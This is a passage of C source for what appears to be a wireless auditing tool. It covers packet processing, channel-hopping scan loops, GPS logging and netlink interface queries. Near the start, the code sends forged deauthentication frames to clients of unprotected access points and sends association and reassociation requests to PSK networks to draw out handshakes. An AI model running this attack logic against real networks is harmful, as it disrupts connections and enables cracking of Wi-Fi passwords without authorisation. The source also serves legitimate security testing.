AP_ESSID)\n\t\t\t\t\t{\n\t\t\t\t\tif(((aplist +i)->ie.flags & APRSNAKM_PSK) != 0) send_80211_authenticationrequest();\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\tif(deauthenticationflag == true)\n\t\t{\n\t\tif(((aplist +i)->count % 8) == 4)\n\t\t\t{\n\t\t\tif(((aplist +i)->ie.flags & AP_MFP) == 0)\n\t\t\t\t{\n\t\t\t\tif(((aplist +i)->ie.flags & APAKM_MASK) != 0)\n\t\t\t\t\t{\n\t\t\t\t\tif(memcmp(&macbc, (aplist +i)->macclient, ETH_ALEN) != 0)\n\t\t\t\t\t\t{\n\t\t\t\t\t\tsend_80211_deauthentication_fm_ap((aplist +i)->macclient, (aplist +i)->macap, WLAN_REASON_CLASS3_FRAME_FROM_NONASSOC_STA);\n\t\t\t\t\t\tsend_80211_deauthentication_fm_client((aplist +i)->macclient, (aplist +i)->macap, WLAN_REASON_DEAUTH_LEAVING);\n\t\t\t\t\t\t}\n\t\t\t\t\telse send_80211_deauthentication_fm_ap(macbc, (aplist +i)->macap, WLAN_REASON_CLASS3_FRAME_FROM_NONASSOC_STA);\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\tif(reassociationflag == true)\n\t\t{\n\t\tif(((aplist +i)->count % 8) == 2)\n\t\t\t{\n\t\t\tif(((aplist +i)->ie.flags & APRSNAKM_PSK) != 0) send_80211_associationrequest_org(i);\n\t\t\t}\n\t\tif(((aplist +i)->count % 8) == 0)\n\t\t\t{\n\t\t\tif(((aplist +i)->ie.flags & APRSNAKM_PSK) != 0) send_80211_reassociationrequest(i);\n\t\t\t}\n\t\t}\n\t(aplist +i)->count -= 1;\n\treturn;\n\t}\nmemset((aplist + i), 0, APLIST_SIZE);\n(aplist +i)->tsakt = tsakt;\n(aplist +i)->tshold1 = tsakt;\n(aplist +i)->tsauth = tsfirst;\n(aplist +i)->count = attemptapmax;\nmemcpy((aplist +i)->macap, macfrx->addr3, ETH_ALEN);\nmemcpy((aplist +i)->macclient, &macbc, ETH_ALEN);\n(aplist +i)->status |= AP_BEACON;\ntagwalk_channel_essid_rsn(&(aplist +i)->ie, beaconlen, beacon->ie);\nif((aplist +i)->ie.channel == 0) (aplist +i)->ie.channel = (scanlist + scanlistindex)->channel;\nif((aplist +i)->ie.channel != (scanlist + scanlistindex)->channel) return;\nif(((aplist +i)->ie.flags & APIE_ESSID) == APIE_ESSID) (aplist +i)->status |= AP_ESSID;\nif(deauthenticationflag == true)\n\t{\n\tif(((aplist +i)->ie.flags & AP_MFP) == 0)\n\t\t{\n\t\tif(((aplist +i)->ie.flags & APAKM_MASK) != 0) send_80211_deauthentication_fm_ap(macbc, (aplist +i)->macap, WLAN_REASON_CLASS3_FRAME_FROM_NONASSOC_STA);\n\t\t}\n\t}\nif(associationflag == true)\n\t{\n\tif((((aplist +i)->ie.flags & APRSNAKM_PSK) != 0) && (((aplist +i)->ie.flags & APIE_ESSID) == 0)) send_80211_authenticationrequest();\n\t}\nif(proberequestflag == true)\n\t{\n\tif(((aplist +i)->ie.flags & APIE_ESSID) == 0) send_80211_proberequest_undirected();\n\t}\nif(reassociationflag == true)\n\t{\n\tif(((aplist +i)->ie.flags & APRSNAKM_PSK) != 0) send_80211_associationrequest_org(i);\n\t}\nwriteepb();\n#ifdef HCXNMEAOUT\nif(fd_gps > 0) writegpwpl(i);\n#endif\nqsort(aplist, i + 1, APLIST_SIZE, sort_aplist_by_tsakt);\ntshold = tsakt;\nreturn;\n}\n/*===========================================================================*/\n/*===========================================================================*/\n#ifdef HCXNMEAOUT\nstatic inline __attribute__((always_inline)) void process_nmea0183(void)\n{\nstatic char *nmeaptr;\nstatic const char *gprmcid = \"$GPRMC,\";\nstatic const char *gpggaid = \"$GPGGA,\";\n\nif((nmealen = read(fd_gps, nmeabuffer, NMEA_SIZE)) < NMEA_MIN)\n\t{\n\tif(packetlen == - 1) errorcount++;\n\treturn;\n\t}\nnmeapacketcount++;\nnmeabuffer[nmealen] = 0;\nif((nmeaptr = strstr(nmeabuffer, gprmcid)) != NULL)\n\t{\n\tgprmclen = 0;\n\twhile(gprmclen < (NMEA_MSG_MAX -2))\n\t\t{\n\t\tif(nmeaptr[gprmclen] == '*')\n\t\t\t{\n\t\t\tgprmclen += NMEA_CS_CR_LF_SIZE;\n\t\t\tmemcpy(&gprmc, nmeaptr, gprmclen);\n\t\t\tbreak;\n\t\t\t}\n\t\tgprmclen++;\n\t\t}\n\t}\nif((nmeaptr = strstr(nmeabuffer, gpggaid)) != NULL)\n\t{\n\tgpggalen = 0;\n\twhile(gpggalen < (NMEA_MSG_MAX -2))\n\t\t{\n\t\tif(nmeaptr[gpggalen] == '*')\n\t\t\t{\n\t\t\tgpggalen += NMEA_CS_CR_LF_SIZE;\n\t\t\tmemcpy(&gpgga, nmeaptr, gpggalen);\n\t\t\treturn;\n\t\t\t}\n\t\tgpggalen++;\n\t\t}\n\t}\nreturn;\n}\n#endif\n/*===========================================================================*/\nstatic inline __attribute__((always_inline)) void process_packet_rca(void)\n{\nif((packetlen = read(fd_socket_rx, packetptr, PCAPNG_SNAPLEN)) < RTHRX_SIZE)\n\t{\n\tif(packetlen == - 1) errorcount++;\n\treturn;\n\t}\nrth = (rth_t*)packetptr;\nif((__hcx32le(rth->it_present) & IEEE80211_RADIOTAP_DBM_ANTSIGNAL) == 0) return;\nif(__hcx16le(rth->it_len) > packetlen)\n\t{\n\terrorcount++;\n\treturn;\n\t}\nieee82011ptr = packetptr + __hcx16le(rth->it_len);\nieee82011len = packetlen - __hcx16le(rth->it_len);\nif(ieee82011len <= MAC_SIZE_RTS) return;\nmacfrx = (ieee80211_mac_t*)ieee82011ptr;\nif((macfrx->from_ds == 1) && (macfrx->to_ds == 1))\n\t{\n\tpayloadptr = ieee82011ptr +MAC_SIZE_LONG;\n\tpayloadlen = ieee82011len -MAC_SIZE_LONG;\n\t}\nelse\n\t{\n\tpayloadptr = ieee82011ptr +MAC_SIZE_NORM;\n\tpayloadlen = ieee82011len -MAC_SIZE_NORM;\n\t}\nclock_gettime(CLOCK_REALTIME, &tspecakt);\ntsakt = ((u64)tspecakt.tv_sec * 1000000000ULL) + tspecakt.tv_nsec;\npacketcount++;\nif(macfrx->type == IEEE80211_FTYPE_MGMT)\n\t{\n\tif(macfrx->subtype == IEEE80211_STYPE_BEACON) process80211beacon_rca();\n\telse if(macfrx->subtype == IEEE80211_STYPE_PROBE_RESP) process80211proberesponse_rca();\n\t}\nreturn;\n}\n/*---------------------------------------------------------------------------*/\nstatic inline __attribute__((always_inline)) void process_packet(void)\n{\nif((packetlen = read(fd_socket_rx, packetptr, PCAPNG_SNAPLEN)) < RTHRX_SIZE)\n\t{\n\tif(packetlen == -1) errorcount++;\n\treturn;\n\t}\nrth = (rth_t*)packetptr;\nif((__hcx32le(rth->it_present) & IEEE80211_RADIOTAP_DBM_ANTSIGNAL) == 0) return;\nif(__hcx16le(rth->it_len) > packetlen)\n\t{\n\terrorcount++;\n\treturn;\n\t}\nieee82011ptr = packetptr + __hcx16le(rth->it_len);\nieee82011len = packetlen - __hcx16le(rth->it_len);\nif(ieee82011len <= MAC_SIZE_RTS) return;\nmacfrx = (ieee80211_mac_t*)ieee82011ptr;\nif((macfrx->from_ds == 1) && (macfrx->to_ds == 1))\n\t{\n\tpayloadptr = ieee82011ptr +MAC_SIZE_LONG;\n\tpayloadlen = ieee82011len -MAC_SIZE_LONG;\n\t}\nelse\n\t{\n\tpayloadptr = ieee82011ptr +MAC_SIZE_NORM;\n\tpayloadlen = ieee82011len -MAC_SIZE_NORM;\n\t}\nclock_gettime(CLOCK_REALTIME, &tspecakt);\ntsakt = ((u64)tspecakt.tv_sec * 1000000000ULL) + tspecakt.tv_nsec;\npacketcount++;\nif(macfrx->type == IEEE80211_FTYPE_MGMT)\n\t{\n\tif(macfrx->subtype == IEEE80211_STYPE_BEACON) process80211beacon();\n\telse if(macfrx->subtype == IEEE80211_STYPE_PROBE_RESP) process80211proberesponse();\n\telse if(macfrx->subtype == IEEE80211_STYPE_PROBE_REQ)\n\t\t{\n\t\tif(memcmp(&macbc, macfrx->addr3, ETH_ALEN) == 0) process80211proberequest_undirected();\n\t\telse process80211proberequest_directed();\n\t\t}\n\telse if(macfrx->subtype == IEEE80211_STYPE_AUTH) process80211authentication();\n\telse if(macfrx->subtype == IEEE80211_STYPE_ASSOC_REQ) process80211associationrequest();\n\telse if(macfrx->subtype == IEEE80211_STYPE_ASSOC_RESP) process80211associationresponse();\n\telse if(macfrx->subtype == IEEE80211_STYPE_REASSOC_REQ)process80211reassociationrequest();\n\telse if(macfrx->subtype == IEEE80211_STYPE_REASSOC_RESP) process80211reassociationresponse();\n\telse if(macfrx->subtype == IEEE80211_STYPE_ACTION) process80211action();\n\t}\nelse if(macfrx->type == IEEE80211_FTYPE_CTL)\n\t{\n\tif(macfrx->subtype == IEEE80211_STYPE_BACK) process80211blockack();\n\telse if(macfrx->subtype == IEEE80211_STYPE_BACK) process80211blockackreq();\n\telse if(macfrx->subtype == IEEE80211_STYPE_PSPOLL) process80211pspoll();\n\t}\nelse if(macfrx->type == IEEE80211_FTYPE_DATA)\n\t{\n\tif((macfrx->subtype &IEEE80211_STYPE_QOS_DATA) == IEEE80211_STYPE_QOS_DATA)\n\t\t{\n\t\tpayloadptr += IEEE80211_QOS_SIZE;\n\t\tpayloadlen -= IEEE80211_QOS_SIZE;\n\t\t}\n\tif(payloadlen > IEEE80211_LLC_SIZE)\n\t\t{\n\t\tllcptr = payloadptr;\n\t\tllc = (ieee80211_llc_t*)llcptr;\n\t\tif((__hcx16be(llc->type) == LLC_TYPE_AUTH) && (llc->dsap == IEEE80211_LLC_SNAP) && (llc->ssap == IEEE80211_LLC_SNAP)) process80211eapauthentication();\n\t\t}\n\tif((macfrx->subtype &IEEE80211_STYPE_QOS_NULLFUNC) == IEEE80211_STYPE_QOS_NULLFUNC) process80211qosnull();\n\telse if((macfrx->subtype &IEEE80211_STYPE_NULLFUNC) == IEEE80211_STYPE_NULLFUNC) process80211null();\n\telse if((macfrx->subtype &IEEE80211_STYPE_QOS_DATA) == IEEE80211_STYPE_QOS_DATA) process80211qosdata();\n\t}\nreturn;\n}\n/*===========================================================================*/\n/*===========================================================================*/\n/* MAIN SCAN LOOP */\nstatic bool nl_scanloop(void)\n{\nstatic ssize_t i;\nstatic int fd_epoll = 0;\nstatic int epi = 0;\nstatic int epret = 0;\nstatic struct epoll_event ev, events[EPOLL_EVENTS_MAX];\nstatic size_t packetcountlast = 0;\nstatic u64 timer1count;\nstatic struct timespec sleepled;\n\nif((fd_epoll= epoll_create(1)) < 0) return false;\nev.data.fd = fd_socket_rx;\nev.events = EPOLLIN;\nif(epoll_ctl(fd_epoll, EPOLL_CTL_ADD, fd_socket_rx, &ev) < 0) return false;\nepi++;\n\nev.data.fd = fd_timer1;\nev.events = EPOLLIN;\nif(epoll_ctl(fd_epoll, EPOLL_CTL_ADD, fd_timer1, &ev) < 0) return false;\nepi++;\n\n#ifdef HCXNMEAOUT\nif(fd_gps > 0)\n\t{\n\tev.data.fd = fd_gps;\n\tev.events = EPOLLIN;\n\tif(epoll_ctl(fd_epoll, EPOLL_CTL_ADD, fd_gps, &ev) < 0) return false;\n\tepi++;\n\t}\n#endif\n\nsleepled.tv_sec = 0;\nsleepled.tv_nsec = GPIO_LED_DELAY;\nwhile(!wanteventflag)\n\t{\n\tif(errorcount > errorcountmax) wanteventflag |= EXIT_ON_ERROR;\n\tepret = epoll_pwait(fd_epoll, events, epi, timerwaitnd, NULL);\n\tif(epret == -1)\n\t\t{\n\t\tif(errno != EINTR)\n\t\t\t{\n\t\t\t#ifdef HCXDEBUG\n\t\t\tfprintf(fh_debug, \"epret: %s\\n\", strerror(errno));\n\t\t\t#endif\n\t\t\terrorcount++;\n\t\t\t}\n\t\tcontinue;\n\t\t}\n\tfor(i = 0; i < epret; i++)\n\t\t{\n\t\tif(events[i].data.fd == fd_socket_rx) process_packet();\n\t\telse if(events[i].data.fd == fd_timer1)\n\t\t\t{\n\t\t\tif(read(fd_timer1, &timer1count, sizeof(u64)) == -1) errorcount++;\n\t\t\tlifetime++;\n\t\t\tclock_gettime(CLOCK_REALTIME, &tspecakt);\n\t\t\ttsakt = ((u64)tspecakt.tv_sec * 1000000000ULL) + tspecakt.tv_nsec;\n\t\t\t#ifdef HCXSTATUSOUT\n\t\t\tshow_realtime();\n\t\t\t#endif\n\t\t\tif((tsakt - tshold) > timehold)\n\t\t\t\t{\n\t\t\t\tscanlistindex++;\n\t\t\t\tif(nl_set_frequency() == false) errorcount++;\n\t\t\t\ttshold = tsakt;\n\t\t\t\t}\n\t\t\t#ifdef HCXNMEAOUT\n\t\t\tif(((lifetime % 2) == 0) && (nmea2pcapflag == true))\n\t\t\t\t{\n\t\t\t\tif((gpggalen > 2) || (gprmclen > 2)) writecbnmea();\n\t\t\t\t}\n\t\t\t#endif\n\t\t\tif((lifetime % 10) == 0)\n\t\t\t\t{\n\t\t\t\tif(gpiostatusled > 0)\n\t\t\t\t\t{\n\t\t\t\t\tGPIO_SET = 1 << gpiostatusled;\n\t\t\t\t\tnanosleep(&sleepled, NULL);\n\t\t\t\t\tGPIO_CLR = 1 << gpiostatusled;\n\t\t\t\t\t}\n\t\t\t\tif(gpiobutton > 0)\n\t\t\t\t\t{\n\t\t\t\t\tif(GET_GPIO(gpiobutton) > 0)\n\t\t\t\t\t\t{\n\t\t\t\t\t\twanteventflag |= EXIT_ON_GPIOBUTTON;\n\t\t\t\t\t\tif(gpiostatusled > 0) GPIO_SET = 1 << gpiostatusled;\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\tif(errortxcount > errorcountmax) wanteventflag |= EXIT_ON_ERROR;\n\t\t\t\t}\n\t\t\tif((tottime > 0) && (lifetime >= tottime)) wanteventflag |= EXIT_ON_TOT;\n\t\t\tif((lifetime % watchdogcountmax) == 0)\n\t\t\t\t{\n\t\t\t\tif(packetcount == packetcountlast) wanteventflag |= EXIT_ON_WATCHDOG;\n\t\t\t\tpacketcountlast = packetcount;\n\t\t\t\t}\n\t\t\tif(beaconoffflag == false) send_80211_beacon();\n\t\t\t}\n\t\t#ifdef HCXNMEAOUT\n\t\telse if(events[i].data.fd == fd_gps) process_nmea0183();\n\t\t#endif\n\t\t}\n\t}\nreturn true;\n}\n/*===========================================================================*/\n/* RCA SCAN LOOP */\nstatic bool nl_scanloop_rca(const char *rcatypeflag)\n{\nstatic ssize_t i;\nstatic int fd_epoll = 0;\nstatic int epi = 0;\nstatic int epret = 0;\nstatic struct epoll_event ev, events[EPOLL_EVENTS_MAX];\nstatic size_t packetcountlast = 0;\nstatic u64 timer1count;\nstatic struct timespec sleepled;\n\ntottime *= 5;\nif((fd_epoll= epoll_create(1)) < 0) return false;\nev.data.fd = fd_socket_rx;\nev.events = EPOLLIN;\nif(epoll_ctl(fd_epoll, EPOLL_CTL_ADD, fd_socket_rx, &ev) < 0) return false;\nepi++;\n\nev.data.fd = fd_timer1;\nev.events = EPOLLIN;\nif(epoll_ctl(fd_epoll, EPOLL_CTL_ADD, fd_timer1, &ev) < 0) return false;\nepi++;\n\nsleepled.tv_sec = 0;\nsleepled.tv_nsec = GPIO_LED_DELAY;\nwhile(!wanteventflag)\n\t{\n\tif(errorcount > errorcountmax) wanteventflag |= EXIT_ON_ERROR;\n\tepret = epoll_pwait(fd_epoll, events, epi, timerwaitnd, NULL);\n\tif(epret == -1)\n\t\t{\n\t\tif(errno != EINTR) errorcount++;\n\t\tcontinue;\n\t\t}\n\tfor(i = 0; i < epret; i++)\n\t\t{\n\t\tif(events[i].data.fd == fd_socket_rx) process_packet_rca();\n\t\telse if(events[i].data.fd == fd_timer1)\n\t\t\t{\n\t\t\tif(read(fd_timer1, &timer1count, sizeof(u64)) == -1) errorcount++;\n\t\t\tlifetime++;\n\t\t\tclock_gettime(CLOCK_REALTIME, &tspecakt);\n\t\t\ttsakt = ((u64)tspecakt.tv_sec * 1000000000ULL) + tspecakt.tv_nsec;\n\t\t\tif((lifetime % 5) == 0) show_realtime_rca();\n\t\t\tif((lifetime % 2) == 0)\n\t\t\t\t{\n\t\t\t\tscanlistindex++;\n\t\t\t\tif(nl_set_frequency() == false) errorcount++;\n\t\t\t\t}\n\t\t\tif(rcatypeflag[0] == 'a')\n\t\t\t\t{\n\t\t\t\tsend_80211_proberequest_undirected();\n\t\t\t\tpacketrcatxcount += 1;\n\t\t\t\t}\n\t\t\tif((lifetime % 10) == 0)\n\t\t\t\t{\n\t\t\t\tif(gpiostatusled > 0)\n\t\t\t\t\t{\n\t\t\t\t\tGPIO_SET = 1 << gpiostatusled;\n\t\t\t\t\tnanosleep(&sleepled, NULL);\n\t\t\t\t\tGPIO_CLR = 1 << gpiostatusled;\n\t\t\t\t\t}\n\t\t\t\tif(gpiobutton > 0)\n\t\t\t\t\t{\n\t\t\t\t\tif(GET_GPIO(gpiobutton) > 0)\n\t\t\t\t\t\t{\n\t\t\t\t\t\twanteventflag |= EXIT_ON_GPIOBUTTON;\n\t\t\t\t\t\tif(gpiostatusled > 0) GPIO_SET = 1 << gpiostatusled;\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\tif((tottime > 0) && (lifetime >= tottime)) wanteventflag |= EXIT_ON_TOT;\n\t\t\tif((lifetime % watchdogcountmax) == 0)\n\t\t\t\t{\n\t\t\t\tif(packetcount == packetcountlast) wanteventflag |= EXIT_ON_WATCHDOG;\n\t\t\t\tpacketcountlast = packetcount;\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t}\nreturn true;\n}\n/*===========================================================================*/\n/*===========================================================================*/\n/* NETLINK */\nstatic struct nlattr *nla_next(const struct nlattr *nla, int *remaining)\n{\nint totlen = NLA_ALIGN(nla->nla_len);\n\n*remaining -= totlen;\nreturn (struct nlattr*)((u8*)nla + totlen);\n}\n/*---------------------------------------------------------------------------*/\nstatic int nla_ok(const struct nlattr *nla, int remaining)\n{\nsize_t r = remaining;\n\nreturn r >= sizeof(*nla) && nla->nla_len >= sizeof(*nla) && nla->nla_len <= r;\n}\n/*---------------------------------------------------------------------------*/\nstatic int nla_datalen(const struct nlattr *nla)\n{\nreturn nla->nla_len - NLA_HDRLEN;\n}\n/*---------------------------------------------------------------------------*/\nstatic void *nla_data(const struct nlattr *nla)\n{\nreturn (u8*)nla + NLA_HDRLEN;\n}\n/*---------------------------------------------------------------------------*/\nstatic void nl_get_supported_bands(interface_t *ipl, struct nlattr* nla)\n{\nstatic int nlanremlen;\nstatic struct nlattr *nlai, *nlan;\nstatic frequencylist_t *freql;\n\nnlai = (struct nlattr*)nla_data(nla);\nnlan = (struct nlattr*)nla_data(nlai);\nif(nlan->nla_type != NL80211_BAND_ATTR_FREQS) return;\nnlai = (struct nlattr*)nla_data(nlan);\nnlanremlen = nlai->nla_len - sizeof(struct nlattr);\nnlan = (struct nlattr*)nla_data(nlai);\nfreql = ipl->frequencylist;\nif(ipl->i > FREQUENCYLIST_MAX -1) return;\n(freql + ipl->i)->frequency = 0;\n(freql + ipl->i)->pwr = 0;\n(freql + ipl->i)->status = 0;\nwhile(nla_ok(nlan, nlanremlen))\n\t{\n\tif(nlan->nla_type == NL80211_FREQUENCY_ATTR_FREQ)\n\t\t{\n\t\t(freql + ipl->i)->frequency = *((u32*)nla_data(nlan));\n\t\t(freql + ipl->i)->channel = frequency_to_channel((freql + ipl->i)->frequency);\n\t\tif((freql + ipl->i)->channel == 0) (freql + ipl->i)->frequency  = 0;\n\t\t}\n\telse if(nlan->nla_type == NL80211_FREQUENCY_ATTR_MAX_TX_POWER) (freql + ipl->i)->pwr = *((u32*)nla_data(nlan));\n\telse if(nlan->nla_type == NL80211_FREQUENCY_ATTR_DISABLED) (freql + ipl->i)->status = IF_STAT_FREQ_DISABLED;\n\tnlan = nla_next(nlan, &nlanremlen);\n\t}\nif((freql + ipl->i)->frequency != 0) ipl->i++;\nreturn;\n}\n/*---------------------------------------------------------------------------*/\nstatic u8 nl_get_supported_iftypes(struct nlattr* nla)\n{\nstruct nlattr *pos = (struct nlattr*)nla_data(nla);\nint nestremlen = nla_datalen(nla);\nwhile(nla_ok(pos, nestremlen))\n\t{\n\tif(pos->nla_type == NL80211_IFTYPE_MONITOR) return IF_HAS_MONITOR;\n\tpos = nla_next(pos, &nestremlen);\n\t}\nreturn 0;\n}\n/*---------------------------------------------------------------------------*/\nstatic bool nl_get_interfacelist(void)\n{\nstatic ssize_t i;\nstatic size_t ii;\nstatic ssize_t msglen;\nstatic int nlremlen = 0;\nstatic u32 ifindex;\nstatic u32 wiphy;\nstatic struct nlmsghdr *nlh;\nstatic struct genlmsghdr *glh;\nstatic struct nlattr *nla;\nstatic struct nlmsgerr *nle;\nstatic char ifname[IF_NAMESIZE];\nstatic u8 vimac[ETH_ALEN];\n\ni = 0;\nnlh = (struct nlmsghdr*)nltxbuffer;\nnlh->nlmsg_type = nlfamily;\nnlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_DUMP | NLM_F_ACK;\nnlh->nlmsg_seq = nlseqcounter++;\nnlh->nlmsg_pid = hcxpid;\ni += sizeof(struct nlmsghdr);\nglh = (struct genlmsghdr*)(nltxbuffer + i);\nglh->cmd = NL80211_CMD_GET_INTERFACE;\nglh->version = 1;\nglh->reserved = 0;\ni += sizeof(struct genlmsghdr);\nnlh->nlmsg_len = i;\nif((write(fd_socket_nl, nltxbuffer, i)) != i) return false;\nii = 0;\nwhile(1)\n\t{\n\tmsglen = read(fd_socket_nl, &nlrxbuffer, NLRX_SIZE);\n\tif(msglen == -1) break;\n\tif(msglen == 0) break;\n\tfor(nlh = (struct nlmsghdr*)nlrxbuffer; NLMSG_OK(nlh, (u32)msglen); nlh = NLMSG_NEXT(nlh, msglen))\n\t\t{\n\t\tif(nlh->nlmsg_type == NLMSG_DONE) return true;\n\t\tif(nlh->nlmsg_type == NLMSG_ERROR)\n\t\t\t{\n\t\t\tnle = (struct nlmsgerr*)(nlrxbuffer + sizeof(struct nlmsghdr));\n\t\t\tif(nle->error == 0) return true;\n\t\t\terrorcount++;\n\t\t\tnlfamily = 0;\n\t\t\treturn false;\n\t\t\t}\n\t\tglh = (struct genlmsghdr*)NLMSG_DATA(nlh);\n\t\tif(glh->cmd != NL80211_CMD_NEW_INTERFACE) continue;\n\t\tnla = (struct nlattr*)((unsigned char*)NLMSG_DATA(nlh) + sizeof(struct genlmsghdr));\n\t\tnlremlen = NLMSG_PAYLOAD(nlh, 0) -4;\n\t\twhile(nla_ok(nla, nlremlen))\n\t\t\t{\n\t\t\tif(nla->nla_type == NL80211_ATTR_IFINDEX) ifindex = *((u32*)nla_data(nla));\n\t\t\tif(nla->nla_type == NL80211_ATTR_IFNAME) strncpy(ifname, nla_data(nla), IF_NAMESIZE -1);\n\t\t\tif(nla->nla_type == NL80211_ATTR_WIPHY)\n\t\t\t\t{\n\t\t\t\twiphy = *((u32*)nla_data(nla));\n\t\t\t\t}\n\t\t\tif(nla->nla_type == NL80211_ATTR_MAC)\n\t\t\t\t{\n\t\t\t\tif(nla->nla_len == 10) memcpy(vimac, nla_data(nla), ETH_ALEN);\n\t\t\t\t}\n\t\t\tnla = nla_next(nla, &nlremlen);\n\t\t\t}\n\t\tfor(ii = 0; ii < INTERFACELIST_MAX; ii++)\n\t\t\t{\n\t\t\tif((ifpresentlist + ii)->wiphy == wiphy)\n\t\t\t\t{\n\t\t\t\t(ifpresentlist + ii)->index = ifindex;\n\t\t\t\tstrncpy((ifpresentlist + ii)->name, ifname, IF_NAMESIZE);\n\t\t\t\tmemcpy((ifpresentlist + ii)->vimac, &vimac, ETH_ALEN);\n\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t}\nreturn false;\n}\n/*---------------------------------------------------------------------------*/\nstatic bool nl_get_interfacestatus(void)\n{\nstatic ssize_t i;\nstatic ssize_t msglen;\nstatic int nlremlen = 0;\nstatic struct nlmsghdr *nlh;\nstatic struct genlmsghdr *glh;\nstatic struct nlattr *nla;\nstatic struct nlmsgerr *nle;\n\ni = 0;\nnlh = (struct nlmsghdr*)nltxbuffer;\nnlh->nlmsg_type = nlfamily;\nnlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;\nnlh->nlmsg_seq = nlseqcounter++;\nnlh->nlmsg_pid = hcxpid;\ni += sizeof(struct nlmsghdr);\nglh = (struct genlmsghdr*)(nltxbuffer + i);\nglh->cmd = NL80211_CMD_GET_INTERFACE;\nglh->version = 1;\nglh->reserved = 0;\ni += sizeof(struct genlmsghdr);\nnla = (struct nlattr*)(nltxbuffer + i);\nnla->nla_len = 8;\nnla->nla_type = NL80211_ATTR_IFINDEX;\n*(u32*)nla_data(nla) = ifaktindex;\ni += 8;\nnlh->nlmsg_len = i;\nif((write(fd_socket_nl, nltxbuffer, i)) != i) return false;\nwhile(1)\n\t{\n\tmsglen = read(fd_socket_nl, &nlrxbuffer, NLRX_SIZE);\n\tif(msglen == -1) break;\n\tif(msglen == 0) break;\n\tfor(nlh = (struct nlmsghdr*)nlrxbuffer; NLMSG_OK(nlh, (u32)msglen); nlh = NLMSG_NEXT(nlh, msglen))\n\t\t{\n\t\tif(nlh->nlmsg_type == NLMSG_DONE) return true;\n\t\tif(nlh->nlmsg_type == NLMSG_ERROR)\n\t\t\t{\n\t\t\tnle = (struct nlmsgerr*)(nlrxbuffer + sizeof(struct nlmsghdr));\n\t\t\tif(nle->error == 0) return true;\n\t\t\terrorcount++;\n\t\t\tnlfamily = 0;\n\t\t\treturn false;\n\t\t\t}\n\t\tglh = (struct genlmsghdr*)NLMSG_DATA(nlh);\n\t\tif(glh->cmd != NL80211_CMD_NEW_INTERFACE) continue;\n\t\tnla = (struct nlattr*)((unsigned char*)NLMSG_DATA(nlh) + sizeof(struct genlmsghdr));\n\t\tnlremlen = NLMSG_PAYLOAD(nlh, 0) -4;\n\t\twhile(nla_ok(nla, nlremlen))\n\t\t\t{\n\t\t\tif(nla->nla_type == NL80211_ATTR_IFTYPE)\n\t\t\t\t{\n\t\t\t\tif(*((u32*)nla_data(nla)) == NL80211_IFTYPE_MONITOR) ifaktstatus |= IF_STAT_MONITOR;\n\t\t\t\t}\n\t\t\tnla = nla_next(nla, &nlremlen);\n\t\t\t}\n\t\t}\n\t}\nreturn false;\n}\n/*---------------------------------------------------------------------------*/\nstatic bool nl_get_regulatorydomain(void)\n{\nstatic ssize_t i;\nstatic ssize_t msglen;\nstatic int nlremlen = 0;\nstatic struct nlmsghdr *nlh;\nstatic struct genlmsghdr *glh;\nstatic struct nlattr *nla;\nstatic struct nlmsgerr *nle;\n\ncountry[0] = 0;\ncountry[1] = 0;\ncountry[2] = 0;\ni = 0;\nnlh = (struct nlmsghdr*)nltxbuffer;\nnlh->nlmsg_type = nlfamily;\nnlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;\nnlh->nlmsg_seq = nlseqcounter++;\nnlh->nlmsg_pid = hcxpid;\ni += sizeof(struct nlmsghdr);\nglh = (struct genlmsghdr*)(nltxbuffer + i);\nglh->cmd = NL80211_CMD_GET_REG;\nglh->version = 1;\nglh->reserved = 0;\ni += sizeof(struct genlmsghdr);\nnlh->nlmsg_len = i;\nif((write(fd_socket_nl, nltxbuffer, i)) != i) return false;\nwhile(1)\n\t{\n\tmsglen = read(fd_socket_nl, &nlrxbuffer, NLRX_SIZE);\n\tif(msglen == -1) break;\n\tif(msglen == 0) break;\n\tfor(nlh = (struct nlmsghdr*)nlrxbuffer; NLMSG_OK(nlh, (u32)msglen); nlh = NLMSG_NEXT(nlh, msglen))\n\t\t{\n\t\tif(nlh->nlmsg_type == NLMSG_DONE) return true;\n\t\tif(nlh->nlmsg_type == NLMSG_ERROR)\n\t\t\t{\n\t\t\tnle = (struct nlmsgerr*)(nlrxbuffer + sizeof(struct nlmsghdr));\n\t\t\tif(nle->error == 0) return true;\n\t\t\terrorcount++;\n\t\t\tnlfamily = 0;\n\t\t\treturn false;\n\t\t\t}\n\t\tglh = (struct genlmsghdr*)NLMSG_DATA(nlh);\n\t\tif(glh->cmd != NL80211_CMD_GET_REG) continue;\n\t\tnla = (struct nlattr*)((unsigned char*)NLMSG_DATA(nlh) + sizeof(struct genlmsghdr));\n\t\tnlremlen = NLMSG_PAYLOAD(nlh, 0) -4;\n\t\twhile(nla_ok(nla, nlremlen))\n\t\t\t{\n\t\t\tif(nla->nla_type == NL80211_ATTR_REG_ALPHA2)\n\t\t\t\t{\n\t\t\t\tif(nla->nla_len == 7) memcpy(country, nla_data(nla), 2);\n\t\t\t\t}\n\t\t\tnla = nla_next(nla, &nlremlen);\n\t\t\t}\n\t\t}\n\t}\nreturn false;\n}\n/*---------------------------------------------------------------------------*/\nstatic bool nl_get_interfacecapabilities(void)\n{\nstatic ssize_t i;\nstatic ssize_t ii;\nstatic ssize_t msglen;\nstatic int nlremlen;\nstatic size_t dnlen;\nstatic struct nlmsghdr *nlh;\nstatic struct genlmsghdr *glh;\nstatic struct nlattr *nla;\nstatic struct nlmsgerr *nle;\nstatic char *drivername = NULL;\nstatic char driverfmt[DRIVER_FORMAT] = { 0 };\nstatic char driverlink[DRIVER_LINK] = { 0 };\n\nnlh = (struct nlmsghdr*)nltxbuffer;\nnlh->nlmsg_type = nlfamily;\nnlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_DUMP | NLM_F_ACK;\nnlh->nlmsg_seq = nlseqcounter++;\nnlh->nlmsg_pid = hcxpid;\ni += sizeof(struct nlmsghdr);\nglh = (struct genlmsghdr*)(nltxbuffer + i);\nglh->cmd = 